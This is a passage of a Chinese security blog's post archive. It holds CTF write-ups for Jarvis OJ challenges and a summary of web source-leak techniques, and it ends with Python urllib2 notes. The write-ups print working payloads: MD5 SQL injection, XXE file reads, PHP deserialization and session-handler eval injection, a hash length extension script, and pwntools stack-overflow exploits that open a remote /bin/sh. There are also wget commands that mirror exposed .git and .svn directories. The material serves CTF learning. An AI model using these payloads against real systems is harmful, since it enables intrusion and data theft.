里拿到一段已知的 hash ，我们也知道需要校验的内容（ admin ），salt 与其长度是未知的，但我们可以通过哈希长度扩展攻击来构造一段想利用的校验内容，即使不知道 salt 也可以得出它的 hash 值。 先将明文进行分组与填充，在其后添加我们想要增加的新内容，即新的校验内容，然后我们把原来得到的 hash 值逆为 key 值（注意 md5 中的值都是小端的），根据 MD5 加密原理，我们已经得到了 key ，就可以得出下一轮的 hash 值了（例如此处的 admin 的 hash 值。） 因为这个题里还有一个 strrev 函数（字符串反转），构造如下 payload： 原校验的内容：;&quot;tseug&quot;:5:s 新添加的内容：;&quot;nimda&quot;:5:s 原hash值：3a4727d57463f122833d9e732f94e4e0 salt 长度未知，需要进行爆破 之前的 wp 里用的是 hash_extender 这个工具，这里使用的是 hashpump 。 把 \\x 都换成 % ，可以得到 role = s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b hsh = fcdc3840332555511c4e4323f6decb07 最后修改一下Cookie得到flag。 修复方法：用 hash($SECRET, hash($message)) 的方式，这样用户就不可控 message 了，另外使用 HMAC 也是可以的。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://iCyris.github.io/tags/CTF/"},{"name":"CRYPTO","slug":"CRYPTO","permalink":"https://iCyris.github.io/tags/CRYPTO/"}]},{"title":"Jarvis OJ Writeup","date":"2017-11-04T03:23:21.000Z","path":"2017/11/04/jarvisoj-wp/","text":"记录一些 Jarvis OJ 上的题。 平台地址：https://www.jarvisoj.com/ WebLogin需要密码才能获得flag哦。 题目入口：http://web.jarvisoj.com:32772/ 在 Headers 里找到一条hint： Hint:&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot; 涉及到一个MD5加密后的注入问题。 关于这条md5语句我们先来看下php手册中的描述： Description string md5 ( string str [, bool raw_output] ) Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16. 注: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE 也就是说，如果md5后的hex转换成字符串后，若包含 &#39;or&#39;&lt;trash&gt; 这样的字符串，那整个sql语句就会变成： SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;&lt;trash&gt;&#39; 就可以进行注入了。 网上找到一个字符串：ffifdyop md5以后：276f722736c95d99e921722cf9ed621c 再转换成字符串即为&#39;or&#39;&lt;trash&gt; 把上面这个字符串作为 password 传入即可。 api调用请设法获得目标机器/home/ctf/flag.txt中的flag值。 题目入口：http://web.jarvisoj.com:9882/ 直接能看到源码： &lt;script&gt; function XHR() { var xhr; try {xhr = new XMLHttpRequest();} catch(e) { var IEXHRVers =[&quot;Msxml3.XMLHTTP&quot;,&quot;Msxml2.XMLHTTP&quot;,&quot;Microsoft.XMLHTTP&quot;]; for (var i=0,len=IEXHRVers.length;i&lt; len;i++) { try {xhr = new ActiveXObject(IEXHRVers[i]);} catch(e) {continue;} } } return xhr; } function send(){ evil_input = document.getElementById(&quot;evil-input&quot;).value; var xhr = XHR(); xhr.open(&quot;post&quot;,&quot;/api/v1.0/try&quot;,true); xhr.onreadystatechange = function () { if (xhr.readyState==4 &amp;&amp; xhr.status==201) { data = JSON.parse(xhr.responseText); tip_area = document.getElementById(&quot;tip-area&quot;); tip_area.value = data.task.search+data.task.value; } }; xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;); xhr.send(&#39;{&quot;search&quot;:&quot;&#39;+evil_input+&#39;&quot;,&quot;value&quot;:&quot;own&quot;}&#39;); } &lt;/script&gt; 光看这个没找到什么特别的东西，搜了一些资料发现这题是关于 XXE漏洞 ，简单地说就是利用 xml 中的 Entity 实体来读取文件或者执行系统命令等，以造成攻击。 这题里先把 Content-Type 改成 application/xml，然后构造： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xdsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;/home/ctf/flag.txt&quot; &gt;]&gt; &lt;methodcall&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; &lt;/methodcall&gt; 就可以获取flag了。 神盾局的秘密这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？ 题目入口：http://web.jarvisoj.com:32768/ 扫了一下目录，只发现了 showing.php 和 index.php。 查看源码发现 &lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt; 感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 showing.php 本身： 可以看到源码，过滤了 pctf 。但是没什么利用方式，如果直接查看 /pctf.php 拿到的是假flag。同样的方式读取 index.php： &lt;?php require_once(&#39;shield.php&#39;); $x = new Shield(); isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;]; if (!empty($g)) { $x = unserialize($g); } echo $x-&gt;readfile(); ?&gt; 然后拿到 shield.php 的源码： &lt;?php //flag is in pctf.php class Shield { public $file; function __construct($filename = &#39;&#39;) { $this -&gt; file = $filename; } function readfile() { if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)==FALSE) { return @file_get_contents($this-&gt;file); } } } ?&gt; shield.php 中说flag在 pctf.php 里，但是在 showing.php 中被过滤了，所以直接读它拿到的是假flag。留意到 index.php 里用了反序列化，可以利用这点构造payload： &lt;?php class Shield { public $file; function __construct($filename = &#39;&#39;) { $this -&gt; file = $filename; } } $a = new Shield(); $a-&gt;file = &quot;pctf.php&quot;; echo serialize($a); ?&gt; 序列化后的结果为： O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;} 利用 index.php 中的 class 参数传入payload然后再反序列化就可以拿到flag了。 http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;} &lt;!--?php //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a} //Fake flag: echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot; ?--&gt; flag在管理员手里只有管理员才能获得flag，你能想办法获得吗？ 题目链接：http://web.jarvisoj.com:32778/ vim备份文件泄露（ /index.php~ ），恢复后拿到源码（题目有点问题，vim -r 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了） &lt;html&gt; &lt;head&gt; &lt;title&gt;Web 350&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body { background:gray; text-align:center; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $auth = false; $role = &quot;guest&quot;; $salt = ; if (isset($_COOKIE[&quot;role&quot;])) { $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) { $auth = true; } else { $auth = false; } else {} $s = serialize($role); setcookie(&#39;role&#39;,$s); $hsh = md5($salt.strrev($s)); setcookie(&#39;hsh&#39;,$hsh); } if ($auth) { echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot; } else { echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;; } ?&gt; &lt;/body&gt; &lt;/html&gt; 核心语句为： $role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])) 查了些资料，发现可以使用 哈希长度扩展攻击 。 做题的时候整理了一下这里涉及的知识点 - 传送门 利用工具： HashPumphash_extender 已有条件： Cookie-hsh：3a4727d57463f122833d9e732f94e4e0 Cookie-role：s%3A5%3A%22guest%22%3B 需要求：md5(salt+strrev(admin)) * salt长度未知 这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本： from urlparse import urlparse from httplib import HTTPConnection from urllib import urlencode import json import time import os import urllib def gao(x, y): #print x #print y url = &quot;http://web.jarvisoj.com:32778/index.php&quot; cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y #print cookie build_header = { &#39;Cookie&#39;: cookie, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&#39;, &#39;Host&#39;: &#39;web.jarvisoj.com:32778&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, } urlparts = urlparse(url) conn = HTTPConnection(urlparts.hostname, urlparts.port or 80) conn.request(&quot;GET&quot;, urlparts.path, &#39;&#39;, build_header) resp = conn.getresponse() body = resp.read() return body for i in xrange(1000): print i # secret len = ??? find_hash = &quot;./hash_extender -d &#39;;\\&quot;tseug\\&quot;:5:s&#39; -s 3a4727d57463f122833d9e732f94e4e0 -f md5 -a &#39;;\\&quot;nimda\\&quot;:5:s&#39; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot; #print find_hash calc_res = os.popen(find_hash).readlines() hash_value = calc_res[0][:32] attack_padding = calc_res[0][32:] attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1]) ret = gao(attack_padding, hash_value) if &quot;Welcome&quot; in ret: print ret break 得到回显： ... 12 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Web 350&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body { background:gray; text-align:center; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} &lt;/h3&gt; &lt;/body&gt; &lt;/html&gt; 同时也可以知道 salt 的长度为12。 PHPINFO题目入口：http://web.jarvisoj.com:32784/ 上来就给出了源码： &lt;?php //A webshell is wait for you ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); //设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 session_start(); class OowoO { public $mdzz; function __construct() { $this-&gt;mdzz = &#39;phpinfo();&#39;; } function __destruct() { eval($this-&gt;mdzz); } } if(isset($_GET[&#39;phpinfo&#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(&#39;index.php&#39;)); } ?&gt; 注意到 session.serialize_handler ，先放一篇关于 PHP 反序列化的文章。 PHP 内置了多种处理器用于在存取 $_SESSION 数据时，对数据进行序列化和反序列化： 处理器 存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列化的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列化的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列化的数组 漏洞产生在 php_serialize 和 php 的解析方式上。如果我们用 php_serialize 的方式构造序列化语句，然后通过 php 解析语句，会出现一些问题，因为在使用 php_serialize 构造语句时我们可以使用 ‘|’ 这个符号，但是在 php 进行解析时会将 ‘|’ 符号前的数据当作数组中的键，其后的数据当作值，这个时候我们就可以构造特殊的语句来进行利用了。 通过 phpinfo 页面可以获得的信息有： php 版本为 5.6.21 。 php.ini 中默认的 session.serialize_handler 为 php_serialize ，而 index.php 中确将它设置成了 php （这就导致了 session 反序列化的问题）。 session.upload_progress.enabled 的状态为 On 。 session.upload_progress.cleanup 为关闭状态（提高了漏洞利用成功率）。 要将数据注入到 session 中，一种情况是开发者本身将用户可控的数据传进了 session （比如 joomla 等）；另一方面则可通过 php 配置不当进行 session 控制，比如 session.upload_progress.enabled is on。当这个设置打开时，php 会记录上传文件的进度，在上传时会将其信息保存在 $_SESSION 中。 下面开始漏洞利用。 首先写一个提交表单备用： &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;gogogo&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; 因为不知道 flag 藏在哪里，先试着获取当前目录下的文件列表。构造 payload ： &lt;?php class OowoO { public $mdzz=&#39;print_r(scandir(dirname(__FILE__)));&#39;; } $obj = new OowoO(); echo serialize($obj); ?&gt; 序列化结果为： O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;} 为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下： |O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;} Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）： 接下来就很简单了，去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php 就好。首先查询 PHPINFO 中的 _SERVER[“SCRIPT_FILENAME”] 得到当前目录为 /opt/lampp/htdocs/ ，将原 ‘xxx’ 处改为: print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;)); 序列化及一些小处理后得到最终 payload ： |O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;} 用同样的方式 POST 一下就好了。 CTF{4d96e37f4be998c50aa586de4ada354a} Pwn[XMAN]level0题目描述： nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d ida 载入，先是 main 函数： .text:00000000004005C6 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:00000000004005C6 public main .text:00000000004005C6 main proc near ; DATA XREF: _start+1D↑o .text:00000000004005C6 .text:00000000004005C6 var_10 = qword ptr -10h .text:00000000004005C6 var_4 = dword ptr -4 .text:00000000004005C6 .text:00000000004005C6 ; __unwind { .text:00000000004005C6 push rbp .text:00000000004005C7 mov rbp, rsp .text:00000000004005CA sub rsp, 10h .text:00000000004005CE mov [rbp+var_4], edi .text:00000000004005D1 mov [rbp+var_10], rsi .text:00000000004005D5 mov edx, 0Dh ; n .text:00000000004005DA mov esi, offset aHelloWorld ; &quot;Hello, World\\n&quot; .text:00000000004005DF mov edi, 1 ; fd .text:00000000004005E4 call _write .text:00000000004005E9 mov eax, 0 .text:00000000004005EE call vulnerable_function .text:00000000004005F3 leave .text:00000000004005F4 retn .text:00000000004005F4 ; } // starts at 4005C6 .text:00000000004005F4 main endp vulnerable_function 函数： .text:00000000004005A6 public vulnerable_function .text:00000000004005A6 vulnerable_function proc near ; CODE XREF: main+28↓p .text:00000000004005A6 .text:00000000004005A6 buf = byte ptr -80h .text:00000000004005A6 .text:00000000004005A6 ; __unwind { .text:00000000004005A6 push rbp .text:00000000004005A7 mov rbp, rsp .text:00000000004005AA add rsp, 0FFFFFFFFFFFFFF80h .text:00000000004005AE lea rax, [rbp+buf] .text:00000000004005B2 mov edx, 200h ; nbytes .text:00000000004005B7 mov rsi, rax ; buf .text:00000000004005BA mov edi, 0 ; fd .text:00000000004005BF call _read .text:00000000004005C4 leave .text:00000000004005C5 retn .text:00000000004005C5 ; } // starts at 4005A6 .text:00000000004005C5 vulnerable_function endp 以及一个未曾被调用但是能够打开 shell 的 callsystem 函数： .text:0000000000400596 public callsystem .text:0000000000400596 callsystem proc near .text:0000000000400596 ; __unwind { .text:0000000000400596 push rbp .text:0000000000400597 mov rbp, rsp .text:000000000040059A mov edi, offset command ; &quot;/bin/sh&quot; .text:000000000040059F call _system .text:00000000004005A4 pop rbp .text:00000000004005A5 retn .text:00000000004005A5 ; } // starts at 400596 .text:00000000004005A5 callsystem endp 可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。 ctrl + k 查看该函数的栈帧，buf 的首地址与栈返回地址的距离差为 (+0000000000000008) - (-0000000000000080) ，即 0x88 ，callsystem 函数的地址为 0x400596 ，接下来就可以写 poc 了： from pwn import * sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9881) padding = &#39;A&#39; * 0x88 add = p64(0x400596) payload = padding + add sh.send(payload) sh.interactive() cat flag： CTF{713ca3944e92180e0ef03171981dcd41} [XMAN]level1题目描述： nc pwn2.jarvisoj.com 9877 level1.80eacdcd51aca92af7749d96efad7fb5 checksec 一下发现什么保护都没有开，这次是一个 32 位的程序，ida 载入之： main 函数： .text:080484B7 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:080484B7 public main .text:080484B7 main proc near ; DATA XREF: _start+17↑o .text:080484B7 .text:080484B7 var_4 = dword ptr -4 .text:080484B7 argc = dword ptr 8 .text:080484B7 argv = dword ptr 0Ch .text:080484B7 envp = dword ptr 10h .text:080484B7 .text:080484B7 ; __unwind { .text:080484B7 lea ecx, [esp+4] .text:080484BB and esp, 0FFFFFFF0h .text:080484BE push dword ptr [ecx-4] .text:080484C1 push ebp .text:080484C2 mov ebp, esp .text:080484C4 push ecx .text:080484C5 sub esp, 4 .text:080484C8 call vulnerable_function .text:080484CD sub esp, 4 .text:080484D0 push 0Eh ; n .text:080484D2 push offset aHelloWorld ; &quot;Hello, World!\\n&quot; .text:080484D7 push 1 ; fd .text:080484D9 call _write .text:080484DE add esp, 10h .text:080484E1 mov eax, 0 .text:080484E6 mov ecx, [ebp+var_4] .text:080484E9 leave .text:080484EA lea esp, [ecx-4] .text:080484ED retn .text:080484ED ; } // starts at 80484B7 .text:080484ED main endp 在调用 vulnerable_function 函数之后 printf “Hello, World!\\n”。 看一下 vulnerable_function 函数： .text:0804847B public vulnerable_function .text:0804847B vulnerable_function proc near ; CODE XREF: main+11↓p .text:0804847B .text:0804847B buf = byte ptr -88h .text:0804847B .text:0804847B ; __unwind { .text:0804847B push ebp .text:0804847C mov ebp, esp .text:0804847E sub esp, 88h .text:08048484 sub esp, 8 .text:08048487 lea eax, [ebp+buf] .text:0804848D push eax .text:0804848E push offset format ; &quot;What&#39;s this:%p?\\n&quot; .text:08048493 call _printf .text:08048498 add esp, 10h .text:0804849B sub esp, 4 .text:0804849E push 100h ; nbytes .text:080484A3 lea eax, [ebp+buf] .text:080484A9 push eax ; buf .text:080484AA push 0 ; fd .text:080484AC call _read .text:080484B1 add esp, 10h .text:080484B4 nop .text:080484B5 leave .text:080484B6 retn .text:080484B6 ; } // starts at 804847B .text:080484B6 vulnerable_function endp 这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。 这样大致的思路就有了。先截取 buf 的首地址，在其中写入拿 shell 的 shellcode ，再用 buf 地址覆盖 vulnerable_function 函数的返回地址使之执行 system(“/bin/sh”) 。不过我们不知道 system 的地址，此时可以用 pwntools 中的 asm() 函数。 asm() 函数可以接收一个字符串作为参数，得到汇编码的机器代码。 这里我们可以用 asm(shellcraft.sh()) 的方式得到目标地址，shellcraft.sh() 就是执行 /bin/sh 的 shellcode。 按照 shellcode + nope*n + ret_address 这个格式就可以拿到 shell 了。 poc: from pwn import * sh = remote(&#39;pwn2.jarvisoj.com&#39;, 9877) shellcode = asm(shellcraft.sh()) p_buf = int(sh.recvline()[14:-2], 16) #print (hex(p_buf)) payload = shellcode + (0x8c-len(shellcode)) * &#39;\\x90&#39; + p32(p_buf) sh.sendline(payload) sh.interactive() cat flag: CTF{82c2aa534a9dede9c3a0045d0fec8617}","tags":[{"name":"CTF","slug":"CTF","permalink":"https://iCyris.github.io/tags/CTF/"}]},{"title":"Web 源码泄漏总结","date":"2017-10-27T13:35:15.000Z","path":"2017/10/27/code-leakage/","text":"源码泄漏的问题经常在一些渗透测试或者 CTF 中出现，这篇文章对一些常见的情况做了点整理。 1、.hg源码泄漏Mercurial，一个版本管理软件。名字是水银的意思，所以用了hg（汞）的缩写。 它的用法和git有点类似，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台，不像git需要MinGW才得以运行，所以也有不少人喜欢用hg进行版本管理。 其泄漏内容主要包括： 项目代码 仓库地址 仓库用户名 漏洞成因在使用hg init初始化代码库的时候，会在当前目录下产生一个.hg的隐藏文件。 e.g. http://www.target.com/.hg 漏洞利用下载.hg文件： wget -r --no-parent --mirror http://www.target.com/.hg 代码重构： hg revert 利用工具 dvcs-ripper 2、.git源码泄漏在Github中被泄露的敏感信息主要包括以下几类： 邮箱信息 SVN信息 内部账号及密码 数据库连接信息 服务器配置信息 这些敏感信息有的只是导致一些无法被外网连接的内网账户信息或者数据库连接信息泄露，但时也可能会导致公司重要的商业秘密或程序源代码被他人窃取，管理员账户被控制或者数据库泄露等，造成巨大的损失。 漏洞成因在运行git init初始化代码库的时候，会在当前目录下面产生一个名为.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 e.g. target.com/.git 漏洞利用下载.git文件 wget --mirror --include-directories=/.git http://www.target.com/.git 代码重构 git reset --hard 利用工具 dvcs-ripper（除了git还支持很多其他的版本管理系统） GitHack 3、.bzr文件泄漏Bazaar也是一个版本管理工具，不多说了。 漏洞成因在通过bzr init初始化项目时会在其根目录下产生名为.bzr的隐藏目录，同样能够暴露大量的源代码与用户信息。 漏洞利用下载.bzr文件： wget -r --no-parent --mirror http://www.target.com/.bzr 回滚版本： bzr revert 利用工具用上面提到的工具就可以。 4、.DS_Store文件泄漏.DS_Store(Desktop Services Store)是macOS目录下的隐藏文件，包含了当前目录结构和一些的自定义信息，如背景和图标位置等，在windows下类似的文件为desktop.ini。暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容，可以说是比较严重的泄露。 使用MacOS开发时，可以把.DS_Store加入忽略列表中（如.gitignore）, 但本质上其只是泄露目录结构, 就算删掉.DS_Store，文件也依然存在于Web服务器可以访问得到的地方，所以最根本的方法还是不要将敏感信息放在Web路径中。 漏洞成因在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 漏洞利用.DS_Store的格式为二进制，内部数据结构为Proprietary格式，可以自行解析并递归下载所有文件。 http://www.target.com/.ds_store 利用工具 ds_store_exp 5、.svn文件泄漏SVN也是一个版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。在git之前这也是一款比较热门的版本管理工具，但现在只有一些国企，研究院，或者比较早的项目仍在使用它进行代码管理。 在SVN中泄漏的内容主要包括： 项目的源代码 svn仓库地址 svn仓库所属用户的用户名 漏洞成因与git类似，svn在项目项目初始化时会在根目录下会创建一个.svn的隐藏文件夹，包含了所有分支commit信息和代码记录。 漏洞利用还是与git相似，先下载目录: wget -r --no-parent --mirror http://www.target.com/.svn 然后进行版本回滚: svn revert --recursive . 利用工具 dvcs-ripper（同时支持旧版与新版的svn） Seay-Svn（一个基于windows平台的工具） 6、.CVS文件泄漏CVS是一个年代比较久远的版本控制系统，通过它可以追踪源代码的历史变化记录。但是因为功能比较简单，而且不支持分支，所以很早前就被上面提到的svn替代了。 因为是纯客户端的工具, 所以只会泄露源代码。 漏洞成因cvs项目在初始化(cvs checkout project)的时候，会在project目录下创建一个名为CVS的目录，其中保存了各个文件的修改和commit记录，通过此目录可以获取代码的历史版本。其中两个关键文件为：CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。 漏洞利用下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理： wget -r --no-parent --mirror http://www.target.com/CVS cvs diff * 利用工具 dvcs-ripper（啊没错又是这个） 7、备份文件备份文件泄露又分为两种情况： 服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。 编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。 1). Vim源码泄露如果发现页面有提示vi或者vim之类的，说明存在swp文件泄露，比如当前页面是/index.php，直接访问/.index.php.swp或者/index.php~，可以直接获得源码。 有的时候可能下载下来的文件是有一定的乱码。在linux下面执行vim -r index.php，可以恢复文件。 2). 常见漏洞检测.rar .zip .7z .tar.gz .bak .swp .txt .html 8、WEB-INF/web.xml泄漏WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件。/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件。 漏洞成因通常一些Web应用我们会使用多个Web服务器搭配使用，解决其中的一个Web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 漏洞利用通过web.xml文件推测应用组件相关类的名字，然后在src目录下查找代码，如果没有源代码可以直接下载class文件反编译即可。 9、配置文件泄露现代Web开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。 漏洞利用通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好常见的配置文件路径，如wordpress的/wp-config.php等，组织成字典然后用脚本进行批量测试。 利用工具 参考字典 10、目录穿越目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致用户可以访问Web根目录的上级从而遍历服务器上的任意文件。 而Web服务器本身也曾经有类似的漏洞，比如Apache Tomcat的UTF-8解析漏洞，具体利用和绕过可以参考这篇文章，这里就不展开讲啦。 参考文章： https://zhuanlan.zhihu.com/p/21296806http://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html","tags":[{"name":"CTF","slug":"CTF","permalink":"https://iCyris.github.io/tags/CTF/"},{"name":"源码泄漏","slug":"源码泄漏","permalink":"https://iCyris.github.io/tags/源码泄漏/"}]},{"title":"Python urllib2 学习笔记","date":"2017-10-26T03:17:52.000Z","path":"2017/10/26/urllib2/","text":"Python urllib2 模块学习笔记。 1. 通过 urllib2 获取网页内容import urllib2 response = urllib2.urlopen(&#39;http://www.baidu.com&#39;) html = response.read() print html # or import urllib2 req = urllib2.Request(&#39;http://www.baidu.com&#39;) response = urllib2.urlopen(req) the_page = response.read() print the_page 2. 发送POST请求import urllib import urllib2 url = &#39;http://www.someserver.com/register.cgi&#39; values = {&#39;name&#39; : &#39;WHY&#39;, &#39;location&#39; : &#39;SDU&#39;, &#39;language&#39; : &#39;Python&#39; } data = urllib.urlencode(values) # 编码工作 req = urllib2.Request(url, data) # 发送请求同时传data表单 response = urllib2.urlopen(req) # 接受反馈的信息 the_page = response.read() # 读取反馈的内容 3. 发送GET请求import urllib2 import urllib data = {} data[&#39;name&#39;] = &#39;WHY&#39; data[&#39;location&#39;] = &#39;SDU&#39; data[&#39;language&#39;] = &#39;Python&#39; url_values = urllib.urlencode(data) print url_values name=Somebody+Here&amp;language=Python&amp;location=Northampton url = &#39;http://www.example.com/example.cgi&#39; full_url = url + &#39;?&#39; + url_values data = urllib2.open(full_url) 4. 设置 UApython 的默认 UA 是 python-urllib/x.y。 import urllib import urllib2 url = &#39;http://www.someserver.com/cgi-bin/register.cgi&#39; user_agent = &#39;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#39; values = {&#39;name&#39; : &#39;WHY&#39;, &#39;location&#39; : &#39;SDU&#39;, &#39;language&#39; : &#39;Python&#39; } headers = { &#39;User-Agent&#39; : user_agent } data = urllib.urlencode(values) req = urllib2.Request(url, data, headers) response = urllib2.urlopen(req) the_page = response.read() 5. URL ERRORimport urllib2 req = urllib2.Request(&#39;http://www.baibai.com&#39;) try: urllib2.urlopen(req) except urllib2.URLError, e: print e.reason 6. HTTP ERRORimport urllib2 req = urllib2.Request(&#39;http://lightless.me/a.php&#39;) try: urllib2.urlopen(req) except Exception, e: print e.code 7. 获取真实的 URLimport urllib2 old_url = &#39;http://rrurl.cn/b1UZuP&#39; req = Request(old_url) response = urlopen(req) print &#39;Old url: &#39; + old_url print &#39;Real url: &#39; + response.geturl() 8. 获取 Header 信息import urllib2 old_url = &#39;http://www.baidu.com&#39; req = Request(old_url) response = urlopen(req) print response.info() 9. Proxy 的设置默认情况下会使用环境变量 http_proxy 来设置代理。 import urllib2 enable_proxy = True proxy_handler = urllib2.ProxyHandler({&quot;http&quot; : &#39;http://some-proxy.com:8080&#39;}) null_proxy_handler = urllib2.ProxyHandler({}) if enable_proxy: opener = urllib2.build_opener(proxy_handler) else: opener = urllib2.build_opener(null_proxy_handler) 